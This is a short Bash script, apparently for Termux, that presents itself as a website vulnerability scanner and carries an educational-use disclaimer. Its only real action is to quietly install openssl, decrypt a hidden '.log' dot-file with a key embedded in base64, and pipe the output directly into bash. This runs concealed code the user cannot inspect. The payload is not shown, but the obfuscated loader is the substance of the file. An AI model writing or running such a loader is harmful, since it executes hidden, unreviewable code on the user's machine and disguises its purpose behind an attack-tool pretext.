#!/bin/bash

#####################################################
# Version     : 1.0.0
# Script Name : run.sh
# Description : This script aims to search for vulnerabilities on websites. Please note that this script is for educational and experimental purposes only. Usage beyond these limits may violate the law. The author is not responsible for misuse or illegal use.
# License     : Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)
# Author      : @ghalangwh.official
# Date        : 09-08-2023
#####################################################

pkg install openssl &> /dev/null
openssl enc -d -base64 -aes-256-cbc -in .*.log -k $(echo "Z2hhbGFuZ3doLm9mZmljaWFsCg==" | base64 -d) -pbkdf2  | bash
